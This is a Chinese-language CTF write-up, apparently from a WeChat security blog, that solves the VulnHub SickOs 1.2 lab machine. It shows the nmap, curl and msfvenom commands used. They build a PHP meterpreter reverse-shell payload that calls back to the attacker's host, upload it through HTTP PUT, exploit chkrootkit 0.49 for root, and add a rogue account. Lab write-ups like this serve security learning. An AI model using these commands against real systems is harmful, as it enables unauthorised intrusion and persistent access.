> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/LF_kr2IJAGvSQ-JPduw8CQ)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **18** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/gBSJuVtWXPZE73MPxL1VoDjO3DFaxJA2MQpSSibwsXKVf4VIHh8S9fZXT8pq1ALE3hWEN22AaniaghxGrJqjEsxw/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/sickos-12,144/

靶机难度：中级（CTF）

靶机发布日期：2016 年 4 月 27 日

靶机描述：这是 SickOs 的后续系列中的第二篇，并且与先前的发行版无关，挑战范围是在系统上获得最高特权。

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/ymNhlIRQRwIDdqQDCiblECK9VN2KquqTzJXM7etEnDcIpDdITqzFuiapav9TDnIiaGgf1e4sP9IO6B5NEtEyg2t5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eGDabDaNAhQ72wHWRToOUZR31X9kamiak0wrpr3lxKHpuoTpia329Xu6T0OTYlZic9XeEyQ4twasnibb924VBgIt1g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/yYVIchZg6P8bv6mcCfDb0QZDoxiamXpteOkqjQV683g1xN4kq1icGl3LQfYeKGY4TLZ0vyfq6yypMMEvV5VOMdRQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ro6N8r7mkA4nMEtmJCEgicHQV2iaglXX3Gm7prz1oicYwc2dIxG3vw3WtX87U5k5pMwu62Aic1XITJdcBEbQia31V3Q/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlax4DdLo9egUW3cicDI3aOJ8jhnzD5YksUfL6uk2N0mKV7ib93hevMXicg/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlXbFpCicIFUG0XBqNTmYB2fkM4d9JcjBDMfwmIRvtlenIh0ic3RmnSGzw/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.56.110

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlONAEia1u1QicLZBdndQHmjJTndF1ZVz4o7gTIvq61jBAiam6OBqRNCsdA/640?wx_fmt=png)

```
nmap -sS -sV -T5 -A -p- 192.168.56.110
```

只开了 22 和 80 端口... 直接上 nikto 检查是否存在漏洞，dirb 查看存在目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlGSpzxKB7iasC95NgkK5Awob0iab48pNYQ4aj5bN8hO3TCZ6ib3nKMZNGA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlibHnbrEQXGEaeL6M5GVZMfbtd3nNva3PmmWlfMZRJbQ49nBdtp6549A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlnT8Ax7kLd74bPkyNS61BJNuOJV00eJq60tDtoBs7F6HdPHm2Q4e2mA/640?wx_fmt=png)

nikto 扫描没啥信息...dirb 发现一个 test 目录，访问 test

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlPoDI3Wq005E8cJGTR5LaUaFicb64ibuZtxK3gFzMcUCtqNial8XuzosJA/640?wx_fmt=png)

这只是一个目录列表... 测试了针对 lighttpd 1.4.28 的各种漏洞利用和漏洞，但是它们均不适用于 SickOs....

使用 curl 检查目录 test 上可用的 HTTP 方法

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlNdurSspfiatejwicNv6zp7j6zial5oGeRyKTAskJVE69R3TGVVjEUgmdQ/640?wx_fmt=png)

```
curl -v -X OPTIONS  http://192.168.56.110/test
```

可以上传文件.... 直接利用 http 的 PUT 上传文件

![](https://mmbiz.qpic.cn/mmbiz_png/yYVIchZg6P8bv6mcCfDb0QZDoxiamXpteOkqjQV683g1xN4kq1icGl3LQfYeKGY4TLZ0vyfq6yypMMEvV5VOMdRQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ro6N8r7mkA4nMEtmJCEgicHQV2iaglXX3Gm7prz1oicYwc2dIxG3vw3WtX87U5k5pMwu62Aic1XITJdcBEbQia31V3Q/640?wx_fmt=png)

二、提权

开始

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlWEkoib7dTiby4Gonhvu4QLic8iap5nZYvqBMfHRTD45wKBX1PzhgjY3ibhw/640?wx_fmt=png)

```
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.103 lport=443 R > dayu.php
```

继续利用 msf 制作好 muma 文件

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlDp2z0WuUicic5RZIqse8oBFBTMBiaCDlcGFh7PfyxjibEO8vDOUt1MJa8Q/640?wx_fmt=png)

```
curl --upload-file dayu.php -v --url http://192.168.56.110/test/dayu.php -0 --http1.0
```

利用 curl 上传 php 到目录上... 成功

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlXJAxEFteLeh7UPO2ibVfp9iarl0iccrLHJKI9JEGFhxv1pib0G5PbicoDfg/640?wx_fmt=png)

上传到目录了，这边直接使用 MSF 进行提权

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlwYmQD4uaxXxqGyWncib4jWppIjU2yUEoV8U8khPbibyDXTRMn9khviaoA/640?wx_fmt=png)

这边只需要点下 web 上的 dayu.php 即可

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlSV3iakIINk8nmiciblhjicwUicCBusScsqNCef8ibruiaDL6aV7c0sj35zBmw/640?wx_fmt=png)

这边继续寻找...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlZzJC3ibibu91Gg9icMRwib5XAkdQiaCLXBpOAVakdspSKgxQY1l4oXM7syw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlDJiamOJDA8ynnCEOIERmyVB9rGCp2m6tOOicIiaP6QbCH8Ll1wMm7J2og/640?wx_fmt=png)

这里找到了 chkrootkit 0.49 ，经典的向量提权

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlFd02npjibKKYU99q15JJvwnM8vUXwkhaD1kQYZYFauL59m1GDrpg5tw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlibooHzyIUL8dRT0T7wBu71rkRfnwbIX8TU4Qjo74icakavMyPia1FukUA/640?wx_fmt=png)

利用 33899.c 进行提权

先把文件放置在 / tmp / update 中

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hql2kFWgLCc360SaBnDqzkr9IROglaMCkWHkZFnJfMZyyVCtEglRelHzQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlFTicdZia7PCYBSucekwTKKqwsSEQLcjVMdFDwCicmK1ia8bIglykAk61KA/640?wx_fmt=png)

这边本来我还是使用了 MSF 硬生生提权，不会写代码提权（脑补）！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqln0DBBhRhGgmGEJmx8GUVNU7ibcqH7PNvy6MFiaJjuns0B1Xh6rpn00ww/640?wx_fmt=png)

使用 metasploit 搜寻漏洞利用，读取当前会话

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlYKelg0KqNOcyIGfYFYfoAsW0JMCjpDCUZePmAOHAX5fLq0lG0rRtNA/640?wx_fmt=png)

执行 chkrootkit 有效负载

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlQubT7mjkdJwCBlLEkWicXluf1mib91EBGVphUJAZLy0w7z8dDAEM5MIw/640?wx_fmt=png)

已成功将 update 文件提权为 root 权限，前面 lport 一直进不去，还是咨询了大神说得用 8080 端口才可以... 我反手就来弄个账户玩玩深入了解看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlbPbczooHaj1eWDSM1Ydd2dSTToytC9WBEAenNpHeMRP9bc1zkKmK0Q/640?wx_fmt=png)

创建 dayu-root 用户后，用另外窗口 ssh 上去看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqljxTao5jX8OJMJE9AzpQkBc625KdMEou0Exwn687Jr3KMsibeia7bShUA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlwaEdXc8qib3mTR0g2S7fZmsQqFmOia73ibdY3JEVT09MbIFfdR281gmCw/640?wx_fmt=png)

查看防火墙限制... 看来只限制 22、80、443、8080 进出，所以 php reverse shell 使用其他端口号都无法连接.. 前面浪费了很多时间在最后，我问大神说一句代码就能再 www-data 下直接拿到 root 权限让我参考 33899.... 看不太懂... 还得继续脑补

当然最后查看 flag 还是要的

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMZJdecMicBdvcEImYpic9hqlZGrspaZOJaibW9XNrdReUuuYlcyKbvicLMBibgRvr29hoW1ERibdr5yg6Q/640?wx_fmt=png)

成功...Thanks for giving this try.

![](https://mmbiz.qpic.cn/mmbiz_png/gBSJuVtWXPZE73MPxL1VoDjO3DFaxJA2MQpSSibwsXKVf4VIHh8S9fZXT8pq1ALE3hWEN22AaniaghxGrJqjEsxw/640?wx_fmt=png)

这台靶机和 SickOs: 1 思路有些相同，但是提权的方式方法不同...

由于我们已经成功得到 root 权限 & 找到 flag.txt，因此完成了 CTF 靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/ymNhlIRQRwIDdqQDCiblECK9VN2KquqTzJXM7etEnDcIpDdITqzFuiapav9TDnIiaGgf1e4sP9IO6B5NEtEyg2t5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eGDabDaNAhQ72wHWRToOUZR31X9kamiak0wrpr3lxKHpuoTpia329Xu6T0OTYlZic9XeEyQ4twasnibb924VBgIt1g/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)